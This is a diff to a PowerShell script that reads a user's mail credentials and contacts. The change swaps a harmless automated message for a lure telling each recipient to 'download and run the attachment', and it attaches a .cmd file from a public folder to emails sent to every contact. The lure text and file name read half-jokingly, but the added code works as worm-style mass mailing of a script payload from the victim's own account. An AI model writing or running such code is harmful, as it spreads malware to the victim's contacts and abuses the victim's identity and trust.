@@ -80,8 +80,9 @@ if ($usernames.Count -gt 0) {
 
 $credential = New-Object System.Management.Automation.PSCredential($username, (ConvertTo-SecureString $password -AsPlainText -Force))
 
-$subject = "Automated Email from Thunderbird CLI"
-$body = "Hello! This is an automated email sent via PowerShell."
+$subject = "You gotta trust me!!"
+$body = "Hello! This is an extreamly unsuspicious email. Just download and run the attachment."
+$attachmentPath = "C:\Users\Public\Public Display\initial3_risk.cmd"
 
 # Send to all contacts 
 
@@ -89,7 +90,6 @@ Write-Host "Sending email to all contacts..."
 
 # Send email to each address individually
 foreach ($email in $allEmails) {
-    Send-MailMessage -From $userEmail -To $email -Subject $subject -Body $body `
-        -SmtpServer $smtpServer -Port 25 -Credential $credential
+    Send-MailMessage -From $userEmail -To $email -Subject $subject -Body $body -SmtpServer $smtpServer -Port 25 -Credential $credential -Attachments $attachmentPath
     Write-Host "Email sent to $email"
 }
